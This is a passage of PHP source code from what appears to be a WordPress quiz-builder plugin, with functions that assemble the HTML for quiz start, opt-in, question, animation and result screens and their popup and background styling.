			$outcometoshow = sqb_user_outcome($id, $dap_id, $course_id, $lesson_id);		 
			if($outcometoshow !=""){
				$show_start_screen ="N";
			}
			if($show_start_screen =="Y"){
				if($quiz_display == 'corner_popup'){
					$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
					$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe corner_popup show_cls '.$classforvh.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn">'.$close_data .$quiz_start_template.'</div></div> </div>';
				} else {
					$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe show_cls '.$classforvh.'" >'.$image_background.''.$quiz_start_template.'</div> ';
				}
			}
		}else{
			if($quiz_display == 'corner_popup'){
				$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';

				if($show_start_screen =="N"){
					$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe corner_popup hide_cls '.$classforvh.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.''.$close_data .$quiz_start_template.'</div></div></div>';
				}else{
					$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe corner_popup show_cls '.$classforvh.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.''.$close_data .$quiz_start_template.'</div></div></div>';					
				}
			} else {

				if($quiz_display != 'popup'){
						if($show_start_screen =="N"){
							$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe hide_cls done_screen '.$classforvh.'" style="'.$default_image.'">'.$image_background.''.$quiz_start_template.'</div> ';
						}else{


							if($quiz_display == 'exit'){ 
								$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
								$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe hide_cls done_screen '.$classforvh.'" style="'.$default_image.'"><div class="modal_pop_center"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data .$quiz_start_template.'</div> </div> </div>';
							}else{
								//$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
								$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe show_cls done_screen '.$classforvh.'  '.$sqb_start_screen_background_image.'" style="'.$default_image.'">'.$image_background.''.$quiz_start_template.'</div> ';
							}



							//$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe show_cls done_screen '.$classforvh.'" style="'.$default_image.'">'.$image_background.''.$quiz_start_template.'</div> ';



							if($template == "template6"){
								$start_temp .= '<style>.Quiz-Template2, #sqb_quiz_builder .Quiz-Template2, #Quiz-Screen-Settings .Quiz-Template, .quiz_quesans_template_outer .Quiz-Template{padding:40px 60px;} .quiz_quesans_template_outer .Quiz-Template-outer { '.$template_width.' } .quiz_outer_fe{padding-left: 12px!important ; padding-right: 12px!important;}</style>';
							}
						}
					}else{
						$start_temp = '<div class="quiz_start_template_outer quiz_outer_fe show_cls done_screen '.$classforvh.'" style="'.$default_image.'">'.$image_background.''.$quiz_start_template.'</div> ';
					}

					

			}
		}	 
		
	}	 

	if($template == "template6"){
		$start_temp .= '<style>.Quiz-Template2.start_temp_outer.quiz_comon_template {position: relative; z-index: 9999;} .modal_pop_corner {z-index: 999;position: relative;}</style>';
	}

	$start_temp = str_replace("https:", "", $start_temp);
	$start_temp = str_replace("http:", "", $start_temp);
	return $start_temp;	 
}


//get first name template Data 
function getFirstnameTemplateData($id,$template_num){	 
	$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($id); 	 
	$quiz_firstname_temp= "";
	$quiz_start_template5="";
	$display_cls=""	;		
	if(isset($sqbtemplateobj)){		 
		$class = "";	
		if($template_num == 'template2'){
			$class = "outer-style1";	
		}else if($template_num == 'template3'){
			$class = "outer-style2";	
		}else if($template_num == 'template4'){
			//$quiz_firstname_temp = "<div class='outer-style3'>";	
		}else if($template_num == 'template7'){
			$class = " outer-style7 ";	
		}else if($template_num == 'template8'){
			$class = " outer-style8 ";	
		}else if($template_num == 'template5'){
			$quiz_start_template5 = urldecode($sqbtemplateobj->getQuizStartTemplateHtml());		
			$quiz_start_template5 =  str_replace('contenteditable="true"','contenteditable="false"',$quiz_start_template5);
			$display_cls="display:none"	;		
		}
		
		$quiz_firstname_template = $sqbtemplateobj->getFirstNameTemplate();
		$quiz_firstname_template =  str_replace('contenteditable="true"','contenteditable="false"',$quiz_firstname_template); 	 
		$quiz_firstname_temp .= '<div class="Quiz-Template2 start_temp_outer quiz_comon_template '.$class.'" style="'.$display_cls.'">'.$quiz_firstname_template.'</div>';
		if($template_num == 'template4'){
			//$quiz_firstname_temp .= '</div>';	
		}
	}	 
	return $quiz_start_template5.$quiz_firstname_temp;	 
}

//get optin template Data 
function getOptinTemplateData($id, $quiz_display, $lesson_id='',$quiz_popup_position='',$template_num=''){
	$optin_temp= "";
	 $classforvh = "";
	if($lesson_id !=''){ //check if lesson id exist
		return $optin_temp;
	}else{ //check if lesson  id is not there , normal flow
		$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($id);	 
		
		$form_action=   "";
		$product_id = "";
		$signup_way = "SQB";
		$sqb_start_screen_background_image = '';
		 
		$lldocroot = defined('SITEROOT') ? SITEROOT : $_SERVER['DOCUMENT_ROOT'];
		if(file_exists($lldocroot . "/dap/dap-config.php")){ 
			include_once ($lldocroot . "/dap/dap-config.php"); 
			$form_action=  SITE_URL_DAP ."/dap/signup_submit.php";			
		} 
		$quizoptin_template_css = '<link href="'.plugin_dir_url(__FILE__).'includes/templates/opt-in/template1/template1.css?v='.rand(1,1000).'" rel="stylesheet">';
		
		$modal_pop_corner_position = '';
		if($quiz_popup_position == 'Left' && $quiz_display == 'corner_popup'){
		$modal_pop_corner_position = 'modal_pop_corner_left';
		}
		$add_new_class = '';
		if($template_num == 'template5'){
			$add_new_class = 'Quiz-Optin-Template5_outer';
		}
		$imgbg_postion ='center top';
		if(isset($sqbtemplateobj)){

			 $sqbObj =  SQB_Quiz::loadById($id);


			 $template =  $sqbObj->getTemplate();
			                                
			        $default_image = '';
			        $image_background = '';
			        if($template == "template6"){

			            if($sqbObj->getTransparentBackgroundSettings() != ''){

			                $get_settings = $sqbObj->getTransparentBackgroundSettings();

			                $get_details = explode("|",$get_settings);

			                $width_sign = $get_details[0];
			                $background_width = $get_details[1];
			                $height_sign = $get_details[2];
			                $background_height = $get_details[3];
			                $settings_image = $get_details[4];
			                $min_height = $get_details[5];
							$imgbg_postion = $get_details[8];
							$background_color = '';
							$height_main = '';
							$template6_background_padding = '';
							if(!empty($get_details[9])){
							$background_color = $get_details[9];
							}
							if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}
							$template6_background_padding = '';
							if(!empty($get_details[12])){
								$template6_background_padding = $get_details[12];
							}
			                if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
								//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
								//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
								$get_img_url = '';
							}else{
								//$default_image .= 'background-image:url('.$settings_image.');';
								$get_img_url = $settings_image;
							}
							if($width_sign == 'px'){
								$default_image .= 'width:'.$background_width.'px;';
								$default_image .= 'background-repeat:no-repeat;';
								$default_image .= 'background-position:'.$imgbg_postion.';';
								$default_image .= 'background-size: cover;';
								$default_image .= 'max-width: 100%;';
								$default_image .= 'position:relative;';
								//$default_image .= 'min-height:'.$height_main.';';
							} else if($width_sign = '%'){
								$default_image .= 'width:'.$background_width.'%;';
								$default_image .= 'background-repeat:no-repeat;';
								$default_image .= 'background-position:'.$imgbg_postion.';';
								$default_image .= 'background-size: cover;';
								$default_image .= 'max-width: 100%;';
								$default_image .= 'position:relative;';
								//$default_image .= 'min-height:'.@$height_main.';';
							}

							if($height_sign == 'px'){
								$default_image .= 'padding:'.$background_height.'px 0;';
							} else if($height_sign = 'vh'){
								$default_image .= 'min-height:'.$background_height.'vh;';
								//$default_image .= 'min-height:'.$min_height.';';
								$show_start_screen =  $sqbObj->getShowStartScreen();
								if(@$show_start_screen =="Y"){
								$default_image .= '';
								} else {
								$default_image .= 'display: none;';
								}
								
								$classforvh = "height-in-vh";
								$default_image .= 'justify-content: center;';
								$default_image .= 'align-items: center;';
								$default_image .= 'position:relative;';
								//$default_image .= 'min-height:'.$height_main.';';
							}
							$default_image .= 'background-color: '.$background_color.';';
							if(!empty($get_details[12])){
								$default_image .= 'padding-top: '.$template6_background_padding.'px;';
								$default_image .= 'padding-bottom: '.$template6_background_padding.'px;';
							}
						}else{
							//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
							$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
							$default_image .= 'background-repeat:no-repeat;';
							$default_image .= 'background-position:'.$imgbg_postion.';';
							$default_image .= 'background-size: cover;';
							$default_image .= 'position:relative;';
							$default_image .= 'min-height:'.$height_main.';';
						} 
						
						if($get_img_url == ''){
						$image_background = '';
						} else {
						$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
						}
					}else if($template == "template8"){
						$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
						if(!empty($customizer_style_settings["template8_background_image"])){
							$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
						}
					}




			$quiz_optin_template = $sqbtemplateobj->getOptinTemplateHtml();	 
			$quiz_optin_template =  str_replace('%%FORM_ACTION%%', $form_action, $quiz_optin_template); 
			$quiz_optin_template =  str_replace('%%PRODUCTID%%', $product_id, $quiz_optin_template); 
			$quiz_optin_template =  str_replace('%%SIGNUPWAY%%', $signup_way, $quiz_optin_template); 
			$quiz_optin_template =  str_replace('%%CURRENTPAGE%%', "", $quiz_optin_template); 
			$quiz_optin_template =  str_replace('contenteditable="true"','contenteditable="false"',$quiz_optin_template); 
			$displaydata= "display:none;"; 	
			if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){			 
				$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
				$optin_temp = '<div class="quiz_optin_template_outer quiz_outer_fe hide_cls '.$add_new_class.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_center"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data .$quiz_optin_template.'</div></div> </div>';	
					
			}else if($quiz_display =="corner_popup"){
				$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
				$optin_temp = '<div class="quiz_optin_template_outer quiz_outer_fe corner_popup hide_cls  '.$add_new_class.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data .$quiz_optin_template.'</div></div> </div>';	
			
			}else{
				$optin_temp = '<div class="quiz_optin_template_outer quiz_outer_fe hide_cls  '.$add_new_class.' '.$classforvh.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.$default_image.'">'.$image_background.''.$quiz_optin_template.'</div> ';
				
			}	 	
			if($template_num == 'template6'){
				$optin_temp .= '<style>.Quiz-Optin-Template.quiz_comon_template, .modal_popup_outer .quiz_quesans_template_outer.modal_popup .modal_pop_center {position: relative; z-index: 999; } .modal_pop_center {z-index: 999;position: relative;}.modal_popup_outer .quiz_optin_template_outer.modal_popup .modal_pop_center {display: -ms-flexbox;display: flex;-ms-flex-align: center;align-items: center;min-height: 100%;padding: 0;width: 100%;height: auto;display: flex;align-items: center;justify-content: center;max-width: 100%;margin: 0;} .modal_popup_outer .quiz_optin_template_outer.modal_popup .modal_pop_center > .modal_pop_inn {transform: translate(0, 0);left: 0;top: 0;}</style>';
			} 
			 
		}

		$nonce = wp_create_nonce( 'opt-nounce');
		$optin_temp .= '<input type="hidden" name="nounce" id="sqb_nounce" value="'.$nonce.'" />';

		$optin_temp = urldecode($optin_temp);
		return $quizoptin_template_css.$optin_temp;	
	} 
}

//get Question Answer template Data 
function getQuesAnsTemplateData($id, $quiz_type, $quiz_display, $quiz_pagination, $question_per_page, $passmark ,  $question_display, $number_of_question, $branching, $display_nextbutton , $questions_random , $question_bank_options, $answers_random, $lesson_id, $show_start_screen, $showhide_ques, $retakedata, $count_manage_lead_data, $course_id, $dap_id, $quiz_popup_position,$template_num,$questions_top_border_setting,$category_option, $display_backbutton ){
	$displaydata= "display:none;";			
	 $classouter= " hide_cls ";
	$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($id);	 
	$quesans_temp= "";
	$mappingarray="";
	$pagination_all_div="";
	$quiz_quesans_template1="";
	$classforvh = '';
	if(isset($sqbtemplateobj)){
		
	$sqbObj =  SQB_Quiz::loadById($id);
    $default_image = '';
    $image_background = '';
	$sqb_start_screen_background_image = '';

	 if($sqbObj){
		 $template =  $sqbObj->getTemplate();
                                
        if($template == "template6"){
			$imgbg_postion ='center top';
            if($sqbObj->getTransparentBackgroundSettings() != ''){

                $get_settings = $sqbObj->getTransparentBackgroundSettings();

                $get_details = explode("|",$get_settings);

                $width_sign = $get_details[0];
                $background_width = $get_details[1];
                $height_sign = $get_details[2];
                $background_height = $get_details[3];
                $settings_image = $get_details[4];
                $min_height = $get_details[5];
                $imgbg_postion = $get_details[8];
				$background_color = '';
				$height_main = '';
				$template6_background_padding = '';
				if(!empty($get_details[9])){
				$background_color = $get_details[9];
				}
				if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}
				
				if(!empty($get_details[12])){
					$template6_background_padding = $get_details[12];
				}

                if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
					//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
					//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
					$get_img_url = '';
				}else{
					//$default_image .= 'background-image:url('.$settings_image.');';
					$get_img_url = $settings_image;
				}
				if($width_sign == 'px'){
					$default_image .= 'width:'.$background_width.'px;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				} else if($width_sign = '%'){
					$default_image .= 'width:'.$background_width.'%;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.@$height_main.';';
				}

				if($height_sign == 'px'){
					$default_image .= 'padding:'.$background_height.'px 0;';
				} else if($height_sign = 'vh'){
					$default_image .= 'min-height:'.$background_height.'vh;';
					//$default_image .= 'min-height:'.$min_height.';';
					if($show_start_screen =="Y"){
					$default_image .= '';
					} else {
					$default_image .= 'display: none;';
					}
					
					$classforvh = "height-in-vh";
					$default_image .= 'justify-content: center;';
					$default_image .= 'align-items: center;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}
				$default_image .= 'background-color: '.$background_color.';';
				if(!empty($get_details[12])){
					$default_image .= 'padding-top: '.@$template6_background_padding.'px;';
					$default_image .= 'padding-bottom: '.@$template6_background_padding.'px;';
				}
			}else{
				//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
				$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
				$default_image .= 'background-repeat:no-repeat;';
				$default_image .= 'background-position:'.$imgbg_postion.';';
				$default_image .= 'background-size: cover;';
				$default_image .= 'position:relative;';
				$default_image .= 'min-height:'.$height_main.';';
			} 
			if($get_img_url == ''){
			$image_background = '';
			} else {
			$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
			}

		}else if($template == "template8"){
			$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
			if(!empty($customizer_style_settings["template8_background_image"])){
				$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
			}
		}
    }




		$modal_pop_corner_position = '';
		if($quiz_popup_position == 'Left' && $quiz_display == 'corner_popup'){
		$modal_pop_corner_position = 'modal_pop_corner_left';
		}
		//$quiz_quesans_template = urldecode($sqbtemplateobj->getQuizQuestionAnswerTemplateHtml());	
		
		$quiz_quesans_template1 = urldecode($sqbtemplateobj->getQuizQuestionAnswerTemplateHtml());	
		if($template == "template8"){
		$quiz_quesans_template1 = preg_replace('/(<[^>]+) style=".*?"/i', '$1', $quiz_quesans_template1);
		}
		$ques_template = $sqbtemplateobj->getQuesTemplate();	
		 //echo $quiz_quesans_template; 
		//get the questions by quiz id
		
		$quiz_quesans_template= '<div class="Quiz-Template-outer " >%%QUESTIONANSWERS%%</div>';
		$get_questions = sqbGetQuestions($id, $quiz_type, $quiz_display, $quiz_pagination, $question_per_page, $question_display, $number_of_question, $ques_template, $branching, $display_nextbutton , $questions_random , $question_bank_options, $answers_random , $lesson_id, $show_start_screen, $retakedata, $count_manage_lead_data, $course_id, $dap_id,$template_num,$questions_top_border_setting, $display_backbutton);			 			
		$quiz_quesans_template =  str_replace('%%QUESTIONANSWERS%%',$get_questions,$quiz_quesans_template); 
		$quiz_quesans_template =  str_replace('contenteditable="true"','contenteditable="false"',$quiz_quesans_template); 
		$lesson_quiz ="";
		$classouter= " hide_cls ";
		//for lesson
		if($lesson_id !=''){
			$lesson_quiz= "all"; 
			$pagination_all_div = " pagination_all_div ";		
			if($show_start_screen =="N"){				
				$displaydata= "display:block;";	
				if($quiz_display == 'exit'){ 
					$classouter= " hide_cls ";
				}else{
					$classouter= " show_cls  ";
				}
			}
		}else{
		 	if($quiz_display != 'popup'){
				if($show_start_screen =="N"){
					$displaydata= "display:block;";
					if($quiz_display == 'exit'){ 
						$classouter= " hide_cls ";
					}else{
						$classouter= " show_cls  ";
					}
				}
			}
	 	}		
		 
		if( $lesson_quiz =="all"){				
			if($branching == 'Y'){	
			}else{
				$pagination_all_div = " pagination_all_div ";				
				
			}		
			$quesans_temp = '<div class="quiz_quesans_template_outer quiz_outer_fe '.$classforvh.' '.$classouter.' '.$pagination_all_div.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.$default_image.'">'.$image_background.''.$quiz_quesans_template.'</div> ';
			

		}else{
			if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){
				$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
				$quesans_temp = '<div class="quiz_quesans_template_outer quiz_outer_fe '.$classforvh.' '.$classouter.' ques_temp_'.$template_num .'  '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_center"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data .$quiz_quesans_template.'</div> </div> </div>';	
			}else if($quiz_display == "corner_popup"){
				/*if($show_start_screen =="N"){
					$displaydata= "display:none;";
					$classouter= " hide_cls  ";
				}else{
					$displaydata= "display:block;";
					$classouter= " show_cls  ";
				}
*/
				$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
				$quesans_temp = '<div class="quiz_quesans_template_outer quiz_outer_fe corner_popup '.$classforvh.' '.$classouter.'  ques_temp_'.$template_num .'  '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data .$quiz_quesans_template.'</div> </div> </div>';	
			}else{
				$pagination_all_div="";
				if($quiz_pagination == 'all'){
					$pagination_all_div = " pagination_all_div ";
				}
				$quesans_temp = '<div class="quiz_quesans_template_outer quiz_outer_fe '.$classforvh.' '.$classouter.' '.$pagination_all_div.'  '.$sqb_start_screen_background_image.'" style="'.$displaydata.$default_image.'">'.$image_background.''.$quiz_quesans_template.'</div> ';	
				
			}		
		}
	    if($template == "template6"){
			$quesans_temp .= '<style>.Quiz-Template-outer {position: relative; z-index: 999; }</style>';
		}
	}
 
	$sqbCategoryCalculations = sqbCategoryCalculations($id, $quiz_type,$category_option);
	$quesans_temp .= '<div class="quiz_quesans_template1" style="display:none">'.$quiz_quesans_template1.'</div><input type="hidden" id="quiz_pagination" name="quiz_pagination" value="'.$quiz_pagination.'" />'	 ;

	$custom_fields_obj = SQB_CustomFields::load();
	$script = '<script>var all_custom_fields = '.json_encode($custom_fields_obj).';</script>';
	
	return $quesans_temp.$sqbCategoryCalculations.$script;	  
}

function getAnimationTemplateData($id, $quiz_type, $outcome_type, $quiz_display, $template_num,$dap_id, $course_id, $lesson_id,$quiz_popup_position,$game_animation_option){
	
	$template = !empty($game_animation_option['template']) ? $game_animation_option['template'] : 'template1';
	$custom_template = !empty($game_animation_option['custom_template']) ? $game_animation_option['custom_template'] : '';
	$background_color = !empty($game_animation_option['background_color']) ? $game_animation_option['background_color'] : '';
	$audio_url = !empty($game_animation_option['audio_url']) ? $game_animation_option['audio_url'] : '';
	$timer_ga = !empty($game_animation_option['timer']) ? $game_animation_option['timer'] : '5';
	$text_ga = !empty($game_animation_option['text']) ? $game_animation_option['text'] : '';
	$custom_image = '';
	$default_template_message = array(
		'template1' => '<p><span style="font-size: 24pt;"><strong><span style="color: #18514a;">Way to go 🎉! Keep going! 💪🏆</span></strong></span></p>',
		'template2' => '<p><span style="font-size: 15pt; color: #333300;"><strong>Way to go, %%FIRST_NAME%%! 🏆</strong></span></p>',
		'template3' => '<p><span style="font-size: 24pt; color: #333300;"><strong>Great Job, %%FIRST_NAME%%! 🏆</strong></span></p>',
		'template4' => '<p><span style="font-size: 15pt; color: #333300;"><strong>Awesome %%FIRST_NAME%% 🎉 Keep going! 💪</strong></span></p>'
	);


	$template = !empty($custom_template) ? '' : $template;
	$template_path = SQB_FILE.'includes/templates/animation/';
	$template_url = plugin_dir_url(__FILE__).'includes/templates/animation/';

	

	if(!empty($custom_template)){
		$template_name	 = 'custom-template';
		$custom_image = $custom_template;
	}else{
		$template_name = $template;
	}

	$audio_content = '';
	if(!empty($audio_url)){
	  $audio_content = '
	  <div class="sqb_player_audio_div">
	      <audio class="sqb_player_audio" src="'.$audio_url.'" loop></audio>
     </div>';
	}
	$main = '<div class="quiz_fun_animation_'.$template_name.' quiz_fun_animation_main" style="display:none">';

	ob_start();

	if(empty($text_ga)){
		$animation_text = !empty($default_template_message[$template]) ? $default_template_message[$template] : '';
	}else{
		$animation_text = $text_ga;
	}

	$outcome_level = !empty($game_animation_option['outcome_message']) ? $game_animation_option['outcome_message'] : 'N';

	if($outcome_level == 'Y'){
		$sqboutcomeobj =  SQB_Outcome::loadByQuizId($id);
		$outcome_animation = '';
		foreach ($sqboutcomeobj as $key => $outcome) {
			
			$outcome_animation .= '<div class="fun-animation-outcome" id="fun-animation-outcome-'.$outcome->getId().'" style="display:none;">';

			if(!empty($outcome->getGameAnimationHtml())){
				$outcome_animation .= $outcome->getGameAnimationHtml();
			}else{
				$outcome_animation .= $animation_text;
			}
			$outcome_animation .= '</div>';
		}
		$animation_text = $outcome_animation;
	}

	include($template_path.$template_name.'.php');

	$template_html = ob_get_clean();

	$template_html = str_replace('%template_path%',$template_url,$template_html);
	$template_html = str_replace('%custom_image%',$custom_image,$template_html);

	$main .= $template_html;

	$main .= '</div>';

	return $main;

}

//get result template Data 
function getResultTemplateData($id, $quiz_type, $outcome_type, $quiz_display, $template_num, $dap_id,  $course_id, $lesson_id, $quiz_popup_position,$showpdfbutton,$pdf_button_html){
	$sqboutcomeobj =  SQB_Outcome::loadByQuizId($id); 
	$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($id); 
	 $classforvh = '';
	$sqbObj =  SQB_Quiz::loadById($id);
	if($sqbObj){

	$template =  $sqbObj->getTemplate();
                                
        $default_image = '';
        $image_background = '';
        $imgbg_postion ='center top';
        if($template == "template6"){

            if($sqbObj->getTransparentBackgroundSettings() != ''){

                $get_settings = $sqbObj->getTransparentBackgroundSettings();

                $get_details = explode("|",$get_settings);

                $width_sign = $get_details[0];
                $background_width = $get_details[1];
                $height_sign = $get_details[2];
                $background_height = $get_details[3];
                $settings_image = $get_details[4];
                $min_height = $get_details[5];
                $imgbg_postion = $get_details[8];
				$background_color = '';
				$height_main = '';
				$template6_background_padding = '';
				if(!empty($get_details[9])){
				$background_color = $get_details[9];
				}
				if(!empty($get_details[11])){
								$height_main = $get_details[11];
							}

				if(!empty($get_details[12])){
					$template6_background_padding = $get_details[12];
				}
				
                if($settings_image == '' || $settings_image == 'none' || $settings_image == 'undefined'){
					//$default_image .= 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
					//$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg)';
					$get_img_url = '';
				}else{
					//$default_image .= 'background-image:url('.$settings_image.');';
					$get_img_url = $settings_image;
				}
				if($width_sign == 'px'){
					$default_image .= 'width:'.$background_width.'px;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				} else if($width_sign = '%'){
					$default_image .= 'width:'.$background_width.'%;';
					$default_image .= 'background-repeat:no-repeat;';
					$default_image .= 'background-position:'.$imgbg_postion.';';
					$default_image .= 'background-size: cover;';
					$default_image .= 'max-width: 100%;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}

				if($height_sign == 'px'){
					$default_image .= 'padding:'.$background_height.'px 0;';
				} else if($height_sign = 'vh'){
					$default_image .= 'min-height:'.$background_height.'vh;';
					//$default_image .= 'min-height:'.$min_height.';';
					$show_start_screen =  $sqbObj->getShowStartScreen();
					if(@$show_start_screen =="Y"){
					$default_image .= '';
					} else {
					$default_image .= 'display: none;';
					}
					
					$classforvh = "height-in-vh";
					$default_image .= 'justify-content: center;';
					$default_image .= 'align-items: center;';
					$default_image .= 'position:relative;';
					//$default_image .= 'min-height:'.$height_main.';';
				}
				$default_image .= 'background-color: '.$background_color.';';
				if(!empty($get_details[12])){
					$default_image .= 'padding-top: '.$template6_background_padding.'px;';
					$default_image .= 'padding-bottom: '.$template6_background_padding.'px;';
				}
			}else{
				//$default_image = 'background-image:url('.plugin_dir_url(__FILE__).'includes/images/template6.jpeg);';
				$get_img_url = plugin_dir_url(__FILE__).'includes/images/template6.jpeg';
				$default_image .= 'background-repeat:no-repeat;';
				$default_image .= 'background-position:'.$imgbg_postion.';';
				$default_image .= 'background-size: cover;';
				$default_image .= 'position:relative;';
				$default_image .= 'min-height:'.$height_main.';';
			}
			if($get_img_url == ''){
			$image_background = '';
			} else { 
			$image_background = '<div class="background-image-template6"><img src="'.$get_img_url.'"></div>';
			}
		}else if($template == "template8"){
			$sqb_start_screen_background_image = '';
			$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
			if(!empty($customizer_style_settings["template8_background_image"])){
				$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
			}
		}
    }


	$quiz_id = $id; 
	//echo "<pre>"; print_r($sqboutcomeobj);	die; 
	$result_temp= "";
	$outcomehtml ="";
	$point_data = ""; 
	$point_outcome_data= "";
	$outcome_redirect_options ="";
	$outcome_hidden_val="";
	$min_point_range_arr= array();
	$max_point_range_arr= array();
	$point_arr= array();
	$top_bg_color = "#f56640";
	 if(isset($sqbtemplateobj)){		 
		$top_bg_color_array =  $sqbtemplateobj->getCommonStyle();
		$top_bg_color_array = explode("|",$top_bg_color_array);
		if($top_bg_color_array[0]){	
			$top_bg_color = $top_bg_color_array[0];	
		}
	}
	
	$modal_pop_corner_position = '';
	$sqb_start_screen_background_image = '';
	if($quiz_popup_position == 'Left' && $quiz_display == 'corner_popup'){
	$modal_pop_corner_position = 'modal_pop_corner_left';
	}
	
	$social_share_obj = SQB_Social_Share:: loadByQuizId($id);

	 $share_url = get_site_url('');
	 $fb_paremets = '';
	 if(isset($social_share_obj)){
		// print_r($social_share_obj);
		 $share_url = $social_share_obj->getShareLink();
		 if($share_url == ''){
			 $share_url = get_site_url('');
		 }
		 $share_name = $social_share_obj->getTitle();
		 $share_description = $social_share_obj->getFbDescription();
		 $share_pictureurl = $social_share_obj->getImage();

		$name = 'facebook';
		$key = 'fb_api_key';	
		$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
		
		$social_share_fb_api_key = '';
		if($obj){ 
			$social_share_fb_api_key =  $obj->getValue();
		}
		
		$quiz_title = '';
		
        $quiz_obj = SQB_Quiz::loadById($id);
    	
        if($quiz_obj){
			$quiz_title =  $quiz_obj->getQuizName();
			$quiz_type = $quiz_obj->getQuizType();
		}
		
		$total_question_array = SQB_QuizQuestions ::loadByQuizId($id);
		$fb_paremets = 'share_name='.$share_name.'&share_description='.$share_description.'&share_pictureurl='.$share_pictureurl.'&share_url='.trim(urlencode($share_url)).'&fbappid='.$social_share_fb_api_key.'&rn='.rand(1,100000).'&quiz_type='.$quiz_type.'&quiz_title='.$quiz_title.'&total_question_array='.count($total_question_array);
		
		 
		
	 }
	
	if(isset($sqboutcomeobj)){		
		foreach($sqboutcomeobj as $outcomeobj){
			if(isset($outcomeobj)){				 
				$outcome_id =  $outcomeobj->getId();
				$outcome_temp_html =  $outcomeobj->getOutcomeHtml();
				$outcome_name =  $outcomeobj->getOutcomeName();
				$point =  $outcomeobj->getPoint();
				
				$point_range1 =  $outcomeobj->getPointRange();
